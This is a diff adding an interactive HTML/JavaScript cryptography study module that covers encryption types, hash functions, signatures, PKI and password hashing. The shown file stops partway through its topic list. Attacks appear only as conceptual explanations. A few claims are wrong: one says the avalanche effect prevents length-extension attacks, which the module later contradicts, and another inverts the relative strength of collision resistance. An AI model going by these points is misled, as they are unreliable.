@@ -1,0 +1,733 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--font-sans);background:transparent;color:var(--color-text-primary)}
+.shell{display:flex;height:700px;border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);overflow:hidden}
+.sidebar{width:224px;min-width:224px;border-right:0.5px solid var(--color-border-tertiary);overflow-y:auto;padding:12px 8px;background:var(--color-background-secondary)}
+.sidebar-title{font-size:11px;font-weight:500;color:var(--color-text-tertiary);text-transform:uppercase;letter-spacing:.06em;padding:4px 8px 10px}
+.nav-item{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:var(--border-radius-md);cursor:pointer;font-size:13px;color:var(--color-text-secondary);margin-bottom:2px;transition:background .15s,color .15s}
+.nav-item:hover{background:var(--color-background-primary);color:var(--color-text-primary)}
+.nav-item.active{background:var(--color-background-primary);color:var(--color-text-primary);font-weight:500;border:0.5px solid var(--color-border-secondary)}
+.nav-num{font-size:11px;color:var(--color-text-tertiary);min-width:16px}
+.nav-item.active .nav-num{color:var(--color-text-secondary)}
+.content{flex:1;overflow-y:auto;padding:28px 32px}
+.topic-tag{display:inline-block;font-size:11px;font-weight:500;color:var(--color-text-info);background:var(--color-background-info);padding:3px 10px;border-radius:var(--border-radius-md);margin-bottom:10px}
+.topic-title{font-size:22px;font-weight:500;margin-bottom:8px}
+.topic-oneliner{font-size:15px;color:var(--color-text-secondary);line-height:1.6;border-left:2px solid var(--color-border-secondary);padding-left:12px;margin-bottom:24px}
+.sec-label{font-size:11px;font-weight:500;color:var(--color-text-tertiary);text-transform:uppercase;letter-spacing:.07em;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.sec-label::after{content:'';flex:1;height:0.5px;background:var(--color-border-tertiary)}
+.sec{margin-bottom:28px}
+.body{font-size:14px;line-height:1.75}
+.body p{margin-bottom:10px}
+.body p:last-child{margin-bottom:0}
+.steps{list-style:none;counter-reset:s}
+.steps li{counter-increment:s;display:flex;gap:10px;margin-bottom:8px;font-size:14px;line-height:1.6}
+.steps li::before{content:counter(s);min-width:22px;height:22px;border-radius:50%;background:var(--color-background-secondary);border:0.5px solid var(--color-border-secondary);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:500;color:var(--color-text-secondary);margin-top:2px;flex-shrink:0}
+.card{border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:12px 14px;margin-bottom:8px;background:var(--color-background-primary)}
+.card-name{font-size:13px;font-weight:500;margin-bottom:4px}
+.card-desc{font-size:13px;color:var(--color-text-secondary);line-height:1.6}
+.code{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:14px 16px;font-family:var(--font-mono);font-size:12px;line-height:1.7;overflow-x:auto;margin-top:6px;white-space:pre}
+.analogy{background:var(--color-background-secondary);border-left:2px solid var(--color-border-info);border-radius:0 var(--border-radius-md) var(--border-radius-md) 0;padding:12px 16px;font-size:14px;color:var(--color-text-secondary);line-height:1.7;font-style:italic}
+.iq{border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:10px 14px;margin-bottom:6px}
+.iq .q{font-size:13px;font-weight:500;margin-bottom:4px}
+.iq .a{font-size:13px;color:var(--color-text-secondary);line-height:1.6}
+.bad{display:flex;gap:10px;margin-bottom:8px;font-size:13px;line-height:1.6}
+.bad .ic{color:var(--color-text-danger);font-size:15px;margin-top:1px;flex-shrink:0}
+.connects{display:flex;flex-wrap:wrap;gap:6px}
+.cp{font-size:12px;padding:5px 12px;border-radius:var(--border-radius-md);border:0.5px solid var(--color-border-tertiary);color:var(--color-text-secondary);background:var(--color-background-primary)}
+table.ct{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
+table.ct th{text-align:left;font-weight:500;padding:6px 10px;border-bottom:0.5px solid var(--color-border-secondary);color:var(--color-text-secondary);font-size:11px;text-transform:uppercase;letter-spacing:.04em}
+table.ct td{padding:6px 10px;border-bottom:0.5px solid var(--color-border-tertiary);vertical-align:top;line-height:1.5;font-size:12px}
+table.ct tr:last-child td{border-bottom:none}
+.warn{display:flex;gap:10px;margin-bottom:8px;font-size:13px;line-height:1.6}
+.warn .ic{color:var(--color-text-warning);font-size:15px;margin-top:1px;flex-shrink:0}
+</style>
+
+<div class="shell">
+<nav class="sidebar">
+  <div class="sidebar-title">Block 5 — Cryptography</div>
+  <div class="nav-item active" onclick="show(0,this)"><span class="nav-num">01</span>Symmetric vs Asymmetric</div>
+  <div class="nav-item" onclick="show(1,this)"><span class="nav-num">02</span>Hash Functions</div>
+  <div class="nav-item" onclick="show(2,this)"><span class="nav-num">03</span>Digital Signatures</div>
+  <div class="nav-item" onclick="show(3,this)"><span class="nav-num">04</span>PKI & Certificates</div>
+  <div class="nav-item" onclick="show(4,this)"><span class="nav-num">05</span>Password Hashing</div>
+  <div class="nav-item" onclick="show(5,this)"><span class="nav-num">06</span>JWT</div>
+  <div class="nav-item" onclick="show(6,this)"><span class="nav-num">07</span>OAuth 2.0</div>
+  <div class="nav-item" onclick="show(7,this)"><span class="nav-num">08</span>Common Attacks</div>
+  <div class="nav-item" onclick="show(8,this)"><span class="nav-num">09</span>TLS Deep Dive</div>
+  <div class="nav-item" onclick="show(9,this)"><span class="nav-num">10</span>Zero-Knowledge Proofs</div>
+</nav>
+<main class="content" id="content"></main>
+</div>
+
+<script>
+const T=[
+
+// 01 — Symmetric vs Asymmetric
+{tag:"Cryptography Primitives",title:"Symmetric vs Asymmetric Encryption",
+oneliner:"Symmetric encryption uses one shared key for both encrypt and decrypt — fast, used for bulk data; asymmetric uses a mathematically linked key pair — slow, used for key exchange and signatures; real systems use both together.",
+secs:[
+{l:"The core problem each solves",b:`<p>Symmetric encryption is fast but has a key distribution problem: how do you securely share the secret key with someone you've never met? Asymmetric encryption solves key distribution — your public key can be sent openly, your private key never leaves your machine. But it's 1000x slower than symmetric. The solution: use asymmetric to establish a shared secret, then use symmetric for everything after that. This is exactly what TLS does.</p>`},
+{l:"Symmetric encryption — AES",b:`<div class="card"><div class="card-name">AES — Advanced Encryption Standard</div><div class="card-desc">Block cipher: encrypts 128-bit blocks. Key sizes: 128, 192, or 256 bits. AES-256 is the gold standard. Hardware-accelerated on modern CPUs (AES-NI instructions → ~1 cycle per byte). Used for: bulk data encryption, disk encryption (BitLocker, LUKS), TLS record layer, database column encryption.</div></div>
+<div class="code">Modes of operation matter enormously:
+  AES-ECB (Electronic Codebook): same plaintext block → same ciphertext block
+    → patterns in plaintext visible in ciphertext. NEVER use.
+  AES-CBC (Cipher Block Chaining): XOR each block with previous ciphertext.
+    Better, but requires padding oracle protection.
+  AES-GCM (Galois/Counter Mode): streaming cipher + authentication tag (MAC).
+    Authenticated Encryption (AEAD): encrypts AND verifies integrity in one pass.
+    → Standard for TLS 1.3, HTTPS, SSH, disk encryption.
+    Requires unique nonce (IV) per encryption — reusing nonce breaks security.
+
+Performance: AES-256-GCM ≈ 3-5 GB/s on modern hardware (AES-NI)</div>`},
+{l:"Asymmetric encryption",b:`<div class="card"><div class="card-name">RSA — Rivest–Shamir–Adleman</div><div class="card-desc">Security based on difficulty of factoring large integers. Key sizes: 2048-bit (minimum today), 4096-bit (recommended for long-term). Speed: ~1000x slower than AES for same data size. Use: key exchange (encrypt a symmetric key with RSA public key), digital signatures. RSA PKCS#1 v1.5 padding is vulnerable to padding oracle — use OAEP or PSS.</div></div>
+<div class="card"><div class="card-name">ECC — Elliptic Curve Cryptography</div><div class="card-desc">Security based on discrete logarithm problem on elliptic curves. Same security as RSA with much smaller keys: P-256 (256-bit ECC) ≈ RSA-3072 security. ~10x faster than RSA. Used in: ECDSA (signatures — Bitcoin, TLS certs), ECDH/ECDHE (key exchange — TLS 1.3). Modern default: prefer ECC over RSA.</div></div>
+<div class="code">Key size equivalence (approximate security level):
+  Security  RSA/DH   ECC
+  80-bit    1024     160   (weak — don't use)
+  128-bit   3072     256   (P-256, standard)
+  192-bit   7680     384   (P-384, high security)
+  256-bit   15360    512   (P-521, very high security)
+
+RSA-2048 ≈ ECC-224 (both ~112-bit security) — ECC wins on size & speed</div>`},
+{l:"Hybrid encryption — how they're used together",b:`<div class="code">TLS/HTTPS hybrid pattern:
+  1. Client has server's public key (from certificate)
+  2. ECDHE key exchange: both parties compute shared secret
+     using ephemeral key pairs (no long-term private key used)
+  3. Derive symmetric session keys from shared secret (HKDF)
+  4. All actual data encrypted with AES-256-GCM using session keys
+
+The asymmetric primitive (ECDHE) runs ONCE per connection.
+AES-GCM runs for EVERY byte transferred.
+
+This is why HTTPS has negligible overhead on modern hardware —
+after the handshake (~1ms), it's all AES-NI-accelerated symmetric crypto.</div>`},
+{l:"Mental model",b:`<div class="analogy">Asymmetric encryption is a public padlock system. You publish your open padlock (public key) to the world — anyone can lock a box with it. Only you have the key (private key) to open it. The problem: padlocks are heavy and slow to apply. Symmetric encryption is a shared combination lock — lightning fast, but you and your partner need to agree on the combination before you can use it. TLS: you use the padlock system just once to securely agree on the combination, then switch to the fast combination lock for everything else.</div>`},
+{l:"Common misconceptions",b:`
+<div class="bad"><span class="ic">✕</span><div>RSA encrypts arbitrary data directly — wrong in practice. RSA can only encrypt data smaller than its key size (~245 bytes for RSA-2048). For any real payload, you encrypt a random AES key with RSA, then encrypt the data with AES. This is hybrid encryption.</div></div>
+<div class="bad"><span class="ic">✕</span><div>Longer keys always mean more secure. Key length only matters within the same algorithm family. AES-128 is considered computationally unbreakable with current technology. RSA-1024 is broken. Context matters more than raw bit count.</div></div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">Why does TLS use both symmetric and asymmetric encryption? Why not just one?</div><div class="a">Asymmetric (ECDHE) solves the key distribution problem — allows two strangers to establish a shared secret without prior contact. But RSA/ECC is ~1000x slower than AES for bulk data. So: use asymmetric once to establish a shared secret, derive symmetric keys, encrypt all data with AES-GCM. Best of both: secure key exchange + fast bulk encryption.</div></div>
+<div class="iq"><div class="q">Why is ECC preferred over RSA in modern systems?</div><div class="a">Same security level with 10x smaller keys and 10x faster operations. P-256 ECC provides 128-bit security with a 256-bit key vs RSA-3072 (3072 bits). Smaller keys mean less data transmitted during TLS handshake, less CPU for mobile devices, and smaller certificate sizes. TLS 1.3 mandates ECDHE — RSA key exchange is deprecated.</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">Hash Functions (HMAC uses both)</span><span class="cp">Digital Signatures (asymmetric)</span><span class="cp">PKI (asymmetric key management)</span><span class="cp">TLS Deep Dive (hybrid in action)</span><span class="cp">JWT (HS256 symmetric, RS256 asymmetric)</span></div>`}
+]},
+
+// 02 — Hash Functions
+{tag:"Cryptography Primitives",title:"Hash Functions",
+oneliner:"A cryptographic hash function maps arbitrary-length input to a fixed-length digest — deterministically, efficiently, and with three security properties: pre-image resistance, second pre-image resistance, and collision resistance.",
+secs:[
+{l:"The three security properties",b:`<div class="card"><div class="card-name">Pre-image resistance (one-way)</div><div class="card-desc">Given hash H(x), it must be computationally infeasible to find x. You can't reverse a hash. This is why hashes protect passwords — even if you see the hash, you can't recover the password.</div></div>
+<div class="card"><div class="card-name">Second pre-image resistance</div><div class="card-desc">Given x and H(x), it must be infeasible to find y ≠ x such that H(y) = H(x). You can't find a different input with the same hash as a given input.</div></div>
+<div class="card"><div class="card-name">Collision resistance</div><div class="card-desc">It must be infeasible to find ANY two different inputs x ≠ y such that H(x) = H(y). The key word: the attacker gets to choose both inputs. Weaker than second pre-image resistance — if you can find any collision, you can forge signatures and certificates.</div></div>`},
+{l:"Avalanche effect",b:`<div class="code">SHA-256 avalanche effect: flip 1 bit → ~50% of output bits change
+
+Input: "hello"
+SHA-256: 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
+
+Input: "hellp"  (one character changed)
+SHA-256: 2c63b6f0c17e03ca5e8aad7ca1d57a86a8f3dc7a2d1fdbbc8bdcf64ba0c71f8d
+
+Output: completely different. No correlation.
+Purpose: prevents partial information leakage — knowing half the input tells you
+         nothing about the hash output. Prevents length-extension attacks.</div>`},
+{l:"SHA-256 vs MD5",b:`<table class="ct"><tr><th></th><th>MD5</th><th>SHA-1</th><th>SHA-256</th><th>SHA-3-256</th></tr>
+<tr><td>Output size</td><td>128 bits</td><td>160 bits</td><td>256 bits</td><td>256 bits</td></tr>
+<tr><td>Speed</td><td>Fastest</td><td>Fast</td><td>Fast (SHA-NI)</td><td>Slower</td></tr>
+<tr><td>Security</td><td style="color:var(--color-text-danger)">Broken (2004)</td><td style="color:var(--color-text-danger)">Broken (2017)</td><td style="color:var(--color-text-success)">Secure</td><td style="color:var(--color-text-success)">Secure</td></tr>
+<tr><td>Collisions found</td><td>Yes (trivial)</td><td>Yes (SHAttered)</td><td>None known</td><td>None known</td></tr>
+<tr><td>Use today</td><td>Checksums only</td><td>Avoid</td><td>Standard</td><td>Post-quantum</td></tr></table>
+<p style="margin-top:10px">MD5 collision demo: Two different PDFs with identical MD5 hash have been publicly demonstrated. The same certificate could be valid for two different domains. MD5 must never be used for security purposes — only for non-security checksums (file integrity checks where adversarial manipulation isn't a concern).</p>`},
+{l:"HMAC — keyed hashing",b:`<p>Hash Message Authentication Code: combines a hash with a secret key to produce a MAC. Unlike a plain hash, only someone with the key can compute or verify the HMAC. Provides both integrity (content unchanged) and authentication (came from key holder).</p>
+<div class="code">HMAC-SHA256(key, message):
+  ipad = 0x36 repeated to block size
+  opad = 0x5C repeated to block size
+  HMAC = SHA256((key XOR opad) || SHA256((key XOR ipad) || message))
+
+Use cases:
+  JWT signature (HS256 = HMAC-SHA256)
+  API request signing (AWS SigV4, Stripe webhook verification)
+  Cookie integrity verification
+  
+Why not just SHA256(key || message)?
+  Vulnerable to length-extension attack: an attacker can append data and compute
+  a valid hash for the extended message without knowing the key.
+  HMAC's double-hash construction prevents this.</div>`},
+{l:"Length-extension attack",b:`<p>SHA-256 (Merkle-Damgård construction) has an exploitable property: given H(secret || message), you can compute H(secret || message || padding || extension) without knowing the secret. This breaks naive MAC constructions like SHA256(key + data). HMAC is specifically designed to prevent this. SHA-3 (Keccak sponge construction) is inherently immune to length-extension attacks.</p>`},
+{l:"Mental model",b:`<div class="analogy">A hash function is a fingerprint machine. Any document, regardless of length, produces a 256-bit fingerprint. Identical documents always produce identical fingerprints. One character changed → completely different fingerprint (avalanche). The machine is a one-way mirror: fingerprint → document is computationally impossible. MD5's fingerprint machine was discovered to have collisions — two different people can have the same fingerprint — making it useless for security, like a biometric system that can't distinguish twins.</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">Why is MD5 "broken" for security purposes but still used for checksums?</div><div class="a">MD5 collisions can be computed in seconds on commodity hardware — two different inputs with the same MD5 are trivially constructable by an attacker. For security (signatures, certificates, password hashing): this means an attacker can forge signatures or create malicious files that hash-match legitimate ones. For non-adversarial checksums (detecting accidental corruption in a download): collisions aren't a threat because nobody is deliberately crafting colliding inputs. Wrong context = broken; right context = fine.</div></div>
+<div class="iq"><div class="q">What is a length-extension attack and why does HMAC prevent it?</div><div class="a">SHA-256's iterative state means: if you know H(secret || data), you can compute H(secret || data || padding || extra) without knowing the secret, by resuming the hash from H's internal state. HMAC wraps two hashes — the outer hash takes the inner hash's output, not its internal state, making the extension impossible. When building MACs, always use HMAC, never H(key || data).</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">Digital Signatures (hash then sign)</span><span class="cp">Password Hashing (slow hashes)</span><span class="cp">JWT (HMAC-SHA256 = HS256)</span><span class="cp">TLS (certificate fingerprints, HKDF)</span></div>`}
+]},
+
+// 03 — Digital Signatures
+{tag:"Cryptography Primitives",title:"Digital Signatures",
+oneliner:"A digital signature uses the signer's private key to sign a hash of the message — anyone with the signer's public key can verify authenticity and integrity, while non-repudiation means the signer cannot later deny signing.",
+secs:[
+{l:"The three guarantees",b:`<div class="card"><div class="card-name">Authenticity</div><div class="card-desc">The message came from the entity holding the private key. Only the key holder could have produced a valid signature.</div></div>
+<div class="card"><div class="card-name">Integrity</div><div class="card-desc">The message hasn't been modified since signing. The signature is over a hash of the message — any change to the message invalidates the signature.</div></div>
+<div class="card"><div class="card-name">Non-repudiation</div><div class="card-desc">The signer cannot later deny having signed the message. Unlike a symmetric MAC (where both parties share the key and either could have created it), only the private key holder could have signed — providing legally binding proof.</div></div>`},
+{l:"How signing works",b:`<div class="code">// SIGNING (done by Alice with her private key)
+message = "Transfer $1000 to Bob"
+digest  = SHA256(message)         // fixed-size hash of the message
+signature = RSA_SIGN(alice_private_key, digest)   // or ECDSA_SIGN
+// Alice sends: (message, signature)
+
+// VERIFICATION (done by Bob with Alice's public key)
+digest_received = SHA256(message)                  // re-hash received message
+valid = RSA_VERIFY(alice_public_key, signature, digest_received)
+// Returns true only if:
+//   1. signature was created with the private key matching alice_public_key
+//   2. the message hasn't been modified since signing
+
+Why hash first?
+  RSA/ECDSA can only sign small inputs (limited by key size).
+  SHA-256 reduces any message to 32 bytes → sign the hash.
+  Hashing also provides the integrity check (hash mismatch = tampered).</div>`},
+{l:"RSA signatures vs ECDSA",b:`<div class="card"><div class="card-name">RSA-PSS (RSA Probabilistic Signature Scheme)</div><div class="card-desc">Secure RSA signature scheme with random padding. Same key pair used for encryption and signing (though using the same key for both is discouraged). Signature size = key size (256 bytes for RSA-2048). Older, widely supported, slower.</div></div>
+<div class="card"><div class="card-name">ECDSA (Elliptic Curve Digital Signature Algorithm)</div><div class="card-desc">Uses ECC. Same security as RSA with much smaller signatures (64 bytes for P-256). Requires a cryptographically random nonce (k) per signature — reusing k reveals the private key (how PS3 was hacked). Used by: Bitcoin/Ethereum transactions, TLS certificates, code signing, JWT RS256 (actually uses RSA) vs ES256 (uses ECDSA P-256).</div></div>
+<div class="card"><div class="card-name">Ed25519 (Edwards-curve DSA)</div><div class="card-desc">Modern signature scheme using Curve25519. Deterministic (no random nonce needed → eliminates ECDSA's k-reuse vulnerability). Very fast. 64-byte signatures. Used by: SSH keys (modern), Signal protocol, Tor, GitHub's commit signing. The recommended default for new systems.</div></div>`},
+{l:"Non-repudiation vs HMAC",b:`<div class="code">HMAC (shared key):
+  Alice and Bob both know key K.
+  Alice signs: HMAC(K, message).
+  Bob verifies: recompute HMAC(K, message).
+  Problem: Bob could also produce this MAC.
+  → No non-repudiation: Alice can say "Bob forged it."
+
+Digital Signature (private key):
+  Only Alice has private_key.
+  Alice signs: SIGN(private_key, H(message)).
+  Bob verifies: VERIFY(alice_public_key, signature, H(message)).
+  Bob cannot produce this signature (doesn't have private_key).
+  → Non-repudiation: only Alice could have signed it.
+
+Use case: legal contracts, financial transactions, software releases,
+          email signing (S/MIME), code signing (jar signing, app stores).</div>`},
+{l:"Mental model",b:`<div class="analogy">A digital signature is a wax seal that only you own the stamp for. You press your unique seal (private key) into wax on the envelope (hash of the message). Anyone can inspect the seal (public key) to confirm it's yours. Crucially: only you have the stamp, so only you could have sealed it — non-repudiation. If someone tampers with the letter (changes the message), the seal breaks visibly (hash mismatch). A MAC is more like a shared password stamp — both parties have it, so either could have applied it.</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">What is non-repudiation and why does it require asymmetric cryptography?</div><div class="a">Non-repudiation: the sender cannot deny having sent the message. Requires asymmetric signatures because only the private key holder can produce a valid signature — the public key alone can only verify, not sign. With symmetric MACs (HMAC), both sender and receiver share the same key, so either party could have produced the MAC. In legal contexts, asymmetric signatures are equivalent to a handwritten signature.</div></div>
+<div class="iq"><div class="q">How was the PS3 (PlayStation 3) hacked using ECDSA?</div><div class="a">Sony reused the same random nonce k for every ECDSA signature in the PS3's firmware signing. If the same k is used twice, the two signatures share a common component, and you can algebraically solve for the private key. Fail8ns (the hacking group) exploited this, extracted Sony's private key, and used it to sign arbitrary software. ECDSA's security depends critically on k being uniquely random per signature. Ed25519 is deterministic — k is derived from the message and private key — eliminating this vulnerability.</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">Hash Functions (sign the hash)</span><span class="cp">PKI (certificates use signatures)</span><span class="cp">JWT (RS256 = RSA signature)</span><span class="cp">TLS (certificate chain verified via signatures)</span><span class="cp">Symmetric vs Asymmetric</span></div>`}
+]},
+
+// 04 — PKI
+{tag:"Infrastructure",title:"PKI & Certificate Chains",
+oneliner:"Public Key Infrastructure is the hierarchical system of Certificate Authorities, digital certificates, and trust chains that lets your browser verify it's talking to the real google.com and not an impersonator.",
+secs:[
+{l:"The core problem PKI solves",b:`<p>Asymmetric encryption gives you a public key, but how do you know the public key you received actually belongs to google.com and wasn't swapped by a man-in-the-middle? PKI solves this with a chain of trust: a small set of globally trusted Certificate Authorities (CAs) vouch for public keys via digitally signed certificates.</p>`},
+{l:"X.509 certificate anatomy",b:`<div class="code">A certificate is a signed data structure containing:
+  Version: 3
+  Serial Number: 0x3A2B7C... (unique per CA)
+  Subject: CN=*.google.com, O=Google LLC, C=US
+  Issuer: CN=GTS CA 1C3, O=Google Trust Services LLC
+  Validity: Not Before: 2024-01-15, Not After: 2024-04-09
+  Public Key: EC (P-256) [Google's actual public key]
+  SANs (Subject Alternative Names): *.google.com, google.com
+  Extensions:
+    Key Usage: Digital Signature
+    Extended Key Usage: TLS Web Server Authentication
+    CRL Distribution Points: http://crls.pki.goog/gts1c3/...
+    OCSP URL: http://ocsp.pki.goog/gts1c3
+  Signature Algorithm: SHA256withECDSA
+  Signature: [GTS CA 1C3's signature over all the above]
+  
+The CA's signature is what makes this trusted — only GTS CA 1C3
+(which your browser already trusts) could have produced this signature.</div>`},
+{l:"Certificate chain — how trust propagates",b:`<div class="code">Trust hierarchy:
+  Root CA ("GlobalSign Root CA")
+    Self-signed (trusts itself)
+    Stored in your OS/browser trust store (~150 root CAs)
+    Kept offline in hardware security modules
+    Signs Intermediate CA certificates
+    
+  Intermediate CA ("GTS CA 1C3" — Google Trust Services)
+    Signed by Root CA
+    Online, issues end-entity certificates
+    Allows Root CA to stay offline (security)
+    
+  End-entity certificate (*.google.com)
+    Signed by Intermediate CA
+    Presented to browsers
+
+Verification chain:
+  Browser receives: [*.google.com cert] + [GTS CA 1C3 cert]
+  1. Verify *.google.com signature using GTS CA 1C3's public key ✓
+  2. Verify GTS CA 1C3 signature using Root CA's public key ✓
+  3. Root CA is in browser's built-in trust store ✓
+  → Server is authenticated</div>`},
+{l:"Certificate pinning",b:`<div class="card"><div class="card-name">Certificate Pinning</div><div class="card-desc">Instead of trusting any CA-signed cert, an app hardcodes (pins) the exact certificate or public key it expects from a server. If a rogue CA issues a fraudulent cert for your domain, normal certificate validation accepts it — pinning rejects it. Used by: mobile banking apps, high-security APIs, HPKP (deprecated in browsers). Risk: if your cert changes (renewal), all pinned clients must be updated simultaneously or they break.</div></div>
+<div class="card"><div class="card-name">Certificate Transparency (CT)</div><div class="card-desc">All publicly trusted certificates must be logged in publicly auditable CT logs (RFC 6962). Browsers require SCT (Signed Certificate Timestamp) proving the cert was logged. Purpose: if a rogue CA issues a fraudulent certificate, it appears in the public log — domain owners can monitor for unauthorized certs. Replaced HPKP as the scalable solution to rogue CA issuance.</div></div>`},
+{l:"Certificate revocation",b:`<div class="code">When a private key is compromised or cert is mis-issued → revoke it:
+
+CRL (Certificate Revocation List):
+  CA publishes a signed list of revoked serial numbers.
+  Browser downloads periodically → stale, large, slow.
+
+OCSP (Online Certificate Status Protocol):
+  Real-time per-cert status check to CA's OCSP responder.
+  Privacy concern: CA learns which sites you visit.
+  Performance: adds a round-trip to every HTTPS connection.
+
+OCSP Stapling:
+  Server fetches its own OCSP response, signs it with its cert,
+  staples it to the TLS handshake. Browser gets freshness proof
+  without contacting the CA. Solved privacy + performance.
+
+Let's Encrypt issues 90-day certs — short validity reduces revocation
+dependency (compromised cert expires quickly).</div>`},
+{l:"Mental model",b:`<div class="analogy">PKI is a government ID system. The Root CA is the government's central authority — its legitimacy is assumed (it's in your OS, installed by your device vendor). Intermediate CAs are regional DMVs. The end-entity certificate is your driver's license, issued by the DMV, signed with the government seal. When you present your ID: verify the DMV's stamp is valid → verify the DMV is accredited by the government → check the government's seal in your trusted list. Certificate pinning is like a bouncer who only accepts one specific person's ID, regardless of whether other government IDs are generally valid.</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">Why does a certificate chain use intermediate CAs instead of the Root CA signing everything directly?</div><div class="a">Security compartmentalization. Root CA private keys are kept offline in air-gapped HSMs — extraordinarily secure but inconvenient for day-to-day issuance. Intermediate CAs are online and actively issue certificates. If an intermediate CA is compromised, only it is revoked — the Root CA and other intermediates are unaffected. If the Root CA key were compromised, every certificate on the internet would be invalidated.</div></div>
+<div class="iq"><div class="q">What is OCSP stapling and why was it invented?</div><div class="a">Without stapling: the browser must contact the CA's OCSP responder on every TLS connection to check if the cert is revoked — adding latency and leaking browsing history to the CA. With stapling: the server pre-fetches a time-stamped OCSP response (valid for hours) and includes it in the TLS handshake. The browser gets revocation proof without any extra round-trip or privacy leakage. Servers should always enable OCSP stapling.</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">Digital Signatures (certs are signed)</span><span class="cp">TLS Deep Dive (cert presented in handshake)</span><span class="cp">Symmetric vs Asymmetric (public keys in certs)</span><span class="cp">DNS (DNSSEC uses PKI concepts)</span></div>`}
+]},
+
+// 05 — Password Hashing
+{tag:"Applied Cryptography",title:"Password Hashing",
+oneliner:"Password hashing uses deliberately slow, salted algorithms — bcrypt, Argon2, or PBKDF2 — to store passwords safely, making offline brute-force attacks economically infeasible even if the database is breached.",
+secs:[
+{l:"Why SHA-256 alone is catastrophically wrong",b:`<div class="code">Problems with SHA256(password):
+
+1. SPEED: SHA-256 runs at ~500 million hashes/second on a GPU.
+   Attacker with one GPU: crack 8-char passwords in minutes.
+
+2. NO SALT: SHA256("password") is always the same value.
+   Rainbow tables: precomputed table of SHA256(common_word) → word
+   Attacker checks: is "5e884898..." in my table? → "password" found instantly.
+   Reverse: database of 100,000 users with SHA256 passwords
+   → one table lookup cracks all users with "password" simultaneously.
+
+3. NO ITERATIONS: a single hash operation completes in nanoseconds.
+
+SHA256 is designed to be FAST (for checksums, HMAC, certificate fingerprints).
+Password hashing needs to be SLOW, SALTED, and MEMORY-HARD.</div>`},
+{l:"Salt — eliminating rainbow tables",b:`<div class="code">Salt: cryptographically random per-user value prepended to password before hashing.
+
+stored_hash = bcrypt(random_salt + password)
+Store: (username, salt, hash) in database
+
+Why salts work:
+  User A: password="pass123", salt="xK9mP..."
+  User B: password="pass123", salt="7rQnL..."
+  A's hash ≠ B's hash even with same password
+  → Each user requires an independent brute-force attack
+  → Rainbow tables useless (would need to precompute for every possible salt)
+
+Salt must be:
+  Random (not username or email — predictable salts are exploitable)
+  Per-user unique (not global — global salt still allows cross-user comparison)
+  At least 128 bits (16 bytes) of entropy</div>`},
+{l:"bcrypt",b:`<div class="card"><div class="card-name">bcrypt (1999, still widely used)</div><div class="card-desc">Blowfish-based. Key feature: work factor parameter (cost factor). bcrypt(password, cost=12): runs 2¹² = 4096 iterations. Increasing cost by 1 doubles the time. As hardware gets faster, you increase the cost factor. Outputs a self-contained string: "$2b$12$[22-char salt][31-char hash]". Max password length: 72 bytes — truncates silently (security implication for long passwords). Built-in salt. ~100ms at cost=12 on modern hardware.</div></div>
+<div class="code">// Java (Spring Security)
+String hash = BCryptPasswordEncoder(12).encode("mypassword");
+// "$2b$12$Uf0eKWShf0eR4VQgEuTDluqHPNZ5g5Q5eH3O..."
+boolean valid = BCryptPasswordEncoder().matches("mypassword", hash);</div>`},
+{l:"Argon2 (winner of the 2015 Password Hashing Competition)",b:`<div class="card"><div class="card-name">Argon2id — recommended default today</div><div class="card-desc">Three tunable parameters: time cost (iterations), memory cost (RAM required per hash), parallelism (threads). Memory-hardness is the key innovation: requires large amounts of RAM to compute — ASICs and GPUs (which have limited memory per core) can't crack it in parallel as effectively. Argon2id combines Argon2i (side-channel resistance) and Argon2d (GPU resistance). OWASP recommends: m=65536KB, t=3, p=4 as minimum.</div></div>
+<div class="code">Argon2id parameters:
+  m=65536  → requires 64MB RAM per hash computation
+  t=3      → 3 iterations over the memory
+  p=4      → 4 parallel threads
+  
+Attacker with GPU:
+  Each GPU core needs 64MB RAM → dramatically limits parallel cracking
+  1000 parallel SHA256 cracks → maybe 10 parallel Argon2id cracks</div>`},
+{l:"PBKDF2",b:`<div class="card"><div class="card-name">PBKDF2 (Password-Based Key Derivation Function 2)</div><div class="card-desc">NIST-recommended, FIPS-140 approved — required in regulated industries (healthcare, government). Applies a PRF (usually HMAC-SHA256) iteratively. No memory hardness — weaker against GPU attacks than bcrypt/Argon2. Iterations: 310,000+ for PBKDF2-SHA256 (OWASP 2023). Use when: compliance requires FIPS-140; otherwise prefer Argon2id.</div></div>`},
+{l:"Comparison",b:`<table class="ct"><tr><th></th><th>bcrypt</th><th>Argon2id</th><th>PBKDF2</th><th>SHA-256</th></tr>
+<tr><td>Memory-hard</td><td>No</td><td style="color:var(--color-text-success)">Yes</td><td>No</td><td>No</td></tr>
+<tr><td>Tunable</td><td>Cost factor</td><td>Time+Mem+Para</td><td>Iterations</td><td>N/A</td></tr>
+<tr><td>GPU resistance</td><td>Good</td><td style="color:var(--color-text-success)">Best</td><td>Moderate</td><td style="color:var(--color-text-danger)">None</td></tr>
+<tr><td>FIPS-140</td><td>No</td><td>No</td><td style="color:var(--color-text-success)">Yes</td><td>Yes</td></tr>
+<tr><td>Recommend</td><td>Legacy OK</td><td style="color:var(--color-text-success)">New systems</td><td>Compliance</td><td style="color:var(--color-text-danger)">Never</td></tr></table>`},
